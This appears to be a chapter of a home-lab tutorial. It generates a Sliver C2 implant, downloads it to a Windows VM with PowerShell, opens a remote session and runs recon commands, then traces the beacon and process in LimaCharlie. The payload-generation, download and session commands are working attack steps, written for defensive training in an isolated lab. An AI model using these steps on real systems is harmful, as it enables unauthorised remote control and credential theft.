# 06 — Attack & Detect

This is the core of the lab — generating a C2 implant, deploying it on the Windows victim, and investigating the activity in LimaCharlie.

---

## Part 1 — Generate the C2 Payload

On the **Ubuntu VM**, launch Sliver:

```bash
sliver-server
```

Inside the Sliver shell, generate an HTTP implant:

```
sliver > generate --http <Ubuntu_VM_IP> --save /opt/sliver
```

Replace `<Ubuntu_VM_IP>` with your Ubuntu static IP (e.g., `192.168.217.232`).

Sliver will output a randomly-named `.exe` file saved to `/opt/sliver/`. Confirm it was created:

```
sliver > implants
```

You should see your new implant listed with its name, protocol, and target platform.

---

## Part 2 — Transfer Payload to Windows VM

### Serve the File via Python HTTP Server

On the Ubuntu VM (exit the Sliver shell first with `exit` or open a second SSH session):

```bash
cd /opt/sliver
python3 -m http.server 80
```

### Download on Windows VM

Open **PowerShell as Administrator** on the Windows VM:

```powershell
IWR -Uri http://<Ubuntu_VM_IP>/<payload_name>.exe -OutFile C:\Users\$env:USERNAME\Downloads\<payload_name>.exe
```

Verify the file landed in Downloads.

---

## Part 3 — Start the C2 Listener

Stop the Python HTTP server (`Ctrl+C`), then relaunch the Sliver server and start an HTTP listener:

```bash
sliver-server
```

Inside the Sliver shell:

```
sliver > http
```

You should see:
```
[*] Starting HTTP :80 listener ...
[*] Successfully started job #1
```

---

## Part 4 — Execute the Payload

On the **Windows VM**, navigate to the Downloads folder and double-click the `.exe`, or run it from PowerShell:

```powershell
C:\Users\$env:USERNAME\Downloads\<payload_name>.exe
```

On the Ubuntu Sliver server, you should see an incoming session:

```
[*] Session 1234ab SOME_NAME - 192.168.217.x:12345 (DESKTOP-XXXXX) - windows/amd64 - ...
```

---

## Part 5 — Interact with the Session

In the Sliver shell, connect to the active session:

```
sliver > use <session_ID>
```

You are now inside the compromised Windows machine. Try these commands:

| Command | What It Does |
|---------|-------------|
| `info` | Session details — hostname, OS, PID |
| `whoami` | Current user context |
| `getprivs` | List privileges for the current user |
| `pwd` | Current working directory on victim |
| `netstat` | Active network connections |
| `ps` | Running processes |
| `ls` | List files in current directory |

---

## Part 6 — Investigate in LimaCharlie

While the implant is running, switch to the **LimaCharlie portal** and investigate:

### 🔍 Network Tab

Look for:
- An outbound connection from a `<random_name>.exe` process to your Ubuntu IP on port 80
- This is the beacon — the implant checking in with the C2 server

### 🔍 Processes Tab

Look for:
- An unsigned process with no parent process or spawned from an unexpected parent (e.g., Explorer → random `.exe`)
- Check the **hash** — click it and run a VirusTotal search

> Even if VirusTotal shows 0/72, mark it as suspicious — custom payloads evade signature detection.

### 🔍 File System Tab

- Browse to `C:\Users\<user>\Downloads\`
- Locate the payload `.exe`
- Note the hash — use it for VirusTotal and threat intel lookups

### 🔍 Timeline Tab

Filter by **Event Type: NETWORK_CONNECTIONS** or **NEW_PROCESS** and look for:

- A new process spawning around the time you ran the payload
- Outbound HTTP connections to the Ubuntu VM IP
- Any `getprivs` actions will show as **SENSITIVE_PROCESS_ACCESS** events

---

## What You're Looking For (IOCs)

| Indicator | Description |
|-----------|-------------|
| Random process name | Sliver generates random implant names |
| Outbound HTTP to internal IP | C2 beacon traffic |
| No valid code signature | Legitimate software is usually signed |
| Process spawned from Downloads | Unusual parent/child relationship |
| LSASS access | Credential dump attempt |

---

## ✅ Checkpoint

- [ ] C2 session established in Sliver
- [ ] `whoami`, `getprivs`, `netstat` all return output
- [ ] Beacon traffic visible in LimaCharlie Network tab
- [ ] Suspicious process identified in LimaCharlie Processes tab

---

➡️ Next: [07 — Detection Rules](07-detection-rules.md)
